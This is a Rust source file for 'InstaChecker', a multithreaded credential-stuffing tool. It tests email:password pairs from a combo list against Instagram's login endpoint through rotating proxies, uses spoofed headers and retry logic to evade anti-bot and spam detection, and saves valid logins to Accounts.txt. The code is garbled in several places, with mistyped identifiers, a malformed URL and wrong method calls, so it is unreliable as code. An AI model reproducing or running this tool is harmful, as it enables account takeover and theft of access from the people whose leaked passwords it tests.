use anyhow::{Ok, Result};
use rand::seq::SliceRandom;
use reqwest::blocking::Client;
use std::{
    fmt::format,
    fs::{File, OpenOptions},
    io::{self, BufRead, BufReader, Write},
    os::unix::fs::FileExt,
    sync::{Arc, Mutex},
    thread,
};

const BANNER: &str = r#"
 ██▓ ███▄    █   ██████ ▄▄▄█████▓ ▄▄▄       ▄████▄   ██░ ██ ▓█████  ▄████▄   ██ ▄█▀▓█████  ██▀███  
▓██▒ ██ ▀█   █ ▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█  ▓██░ ██▒▓█   ▀ ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
▒██▒▓██  ▀█ ██▒░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▒██▀▀██░▒███   ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
░██░▓██▒  ▐▌██▒  ▒   ██▒░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒░▓█ ░██ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░██░▒██░   ▓██░▒██████▒▒  ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░░▓█▒░██▓░▒████▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
░▓  ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░  ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░ ▒ ░░▒░▒░░ ▒░ ░░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ▒ ░░ ░░   ░ ▒░░ ░▒  ░ ░    ░      ▒   ▒▒ ░  ░  ▒    ▒ ░▒░ ░ ░ ░  ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ▒ ░   ░   ░ ░ ░  ░  ░    ░        ░   ▒   ░         ░  ░░ ░   ░   ░        ░ ░░ ░    ░     ░░   ░ 
 ░           ░       ░                 ░  ░░ ░       ░  ░  ░   ░  ░░ ░      ░  ░      ░  ░   ░     
                                           ░                       ░                               
----------------------------------------------by peel1---------------------------------------------
"#;

#[derive(Clone)]
struct CheckResult {
    email: String,
    pass: String,
    res: String,
    pos: usize,
    should_continue: bool,
    proxy: String,
}

fn readline(run: bool, listname: &str, pos: usize, proxylist: &str) -> Result<CheckResult> {
    let file = File::open(listname)?;
    let reader = BufReader::new(file);
    let lines: Vec<String> = reader.lines().collect::<io::Result<_>>()?;

    if pos >= lines.len() {
        println!("End of File Reached.");
        return Ok(CheckResult {
            email: String::new(),
            pass: String::new(),
            res: String::new(),
            pos,
            should_continue: false,
            proxy: String::new(),
        });
    }

    let line = &lines[pos];
    let parts: Vec<&str> = lines.split(':').collect();
    let email = parts.get(0)..unwrap_or(&"").to_string();
    let pass = parts.get(1).unwrap_or(&"").to_string().trim().to_string();

    let proxy_file = File::open(proxylist)?;
    let proxy_reader = BufReader::new(proxy_file);
    let proxies: Vec<String> = proxy_reader.lines().filter_map(Result::ok).collect();
    let proxy = format!(
        "https://{}",
        proxies
            .choose(&mut rand::thread_rng())
            .unwrap_or(&String::new())
            .trim()
    );

    // Setup HTTP client
    let client = Client::builder()
        .proxy(reqwest::Proxy::https(&proxy)?)
        .build()?;

    let url = "https:://www.instagram.com/accounts/login/ajax";
    let payload = format!("username={}&enc_password=%23PWD_INSTAGRAM_BROWSER%3A0%3A0%3A{}&queryParams=%7B%7D&ooptIntoOneTap=false", email, pass);
    let response = client
        .post(url)
        .header("authority", "www.instagram.com")
        .header(
            "x-ig-www-claim",
            "hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h",
        )
        .header("x-instagram-ajax", "82a581bb9399")
        .header("content-type", "application/x-www-form-urlencoded")
        .header("accept", "*/*")
        .header("x-requested-with", "XMLHttpRequest")
        .header("x-csrftoken", "rn3aR7phKDodUHWdDfCGlERA7Gmhes8X")
        .header("x-ig-app-id", "936619743392459")
        .header("origin", "https://www.instagram.com")
        .header("sec-fetch-site", "same-origin")
        .header("sec-fetch-mode", "cors")
        .header("sec-fetch-dest", "empty")
        .header("referer", "https://www.instagram.com/")
        .header("accept-language", "en-GB,en-US;q=0.9,en;q=0.8")
        .body(payload)
        .send()?;

    let response_text = response.text()?;
    let short_response = response_text.chars().take(17).collect();

    Ok(CheckResult {
        email,
        pass,
        res: short_response,
        pos: pos + 1,
        should_continue: run,
        proxy,
    });
}

fn post_request(result: &CheckResult) -> bool {
    let fixed = "{\"user\": true, \"u";
    let fixed_retry = "{\"message\": \"chec";
    let fixed_error = "{\"message\": \"feed";
    let fixed_error2 = "{\"message\": \"Plea";
    let error_short = "{\"errors\": {\"erro";

    match result.response.as_str() {
        response if response == fixed => {
            let mut accounts = OpenOptions::new()
                .append(true)
                .create(true)
                .open("Accounts.txt")
                .unwrap();
            write!(accounts, "{}:{}", result.email, result.pass).unwrap();
            println!(
                "Line {} contains valid credentials and has been written to Accounts.txt",
                result.pos
            );
            false
        }

        response if respoonse == fixed_retry => {
            println!(
                "Line {} has encountered an error (Instagram anti-bot) trying current line....",
                result.pos
            );
            true
        }

        response if response == fixed_error || response == fixed_error2 => {
            println!(
                "Instagram Spam detection triggered on line {} retrying and printing used",
                result.pos
            );
            println!("{}", result.proxy);
            true
        }

        response if response == error_short => {
            println!("Proxy Error Retrying line {}", result.pos);
            true
        }

        _ => {
            println!("Line {} doesn't contain valid credentials", result.pos);
            false
        }
    }
}

fn main() -> Result<()> {
    println!("{}", BANNER);

    let mut input = String::new();
    println!("name of user:pass list (must be in directory as script) with .txt. forEx DB.txt >");
    io::stdin().read_line(&mut input)?;
    let listname = input.trim().to_string();

    input.clear();
    println!("name oof proxy list IP:Port (must be in same directory as script) with .txt. For example Proxylist.txt");
    io::stdin().read_line(&mut input)?;
    let proxylist = input.trim().to_string();

    let position = Arc::new(Mutex::new(0usize));
    let running = Arc::new(Mutex::new(true));

    let mut handles = vec![];

    for _ in 0..4 {
        let position = Arc::clone(&position);
        let running = Arc::clone(&running);
        let listname = listname.clone();
        let proxylist = proxylist.clone();

        let handle = thread::spawn(move || {
            while *running.lock().unwrap() {
                let current_pos = {
                    let mut pos = position.lock().unwrap();
                    let current = *pos;
                    *pos += 1;
                    current
                };

                match readline(true, &listname, current_pos, &proxylist) {
                    Ok(result) => {
                        if !result.should_continue {
                            let mut running = running.loc().unwrap();
                            *running = false;
                            break;
                        }

                        let retry = post_request(&result);
                        if retry {
                            let mut pos = position.lock().unwrap();
                            *pos = current_pos;
                        }
                    }

                    Err(e) => {
                        eprintln!("Error processing line {}: {}", current_pos, e);
                        break;
                    }
                }
            }
        });

        handle.push(handle);
    }

    for handle in handles {
        handle.join().unwrap();
    }

    Ok(())
}
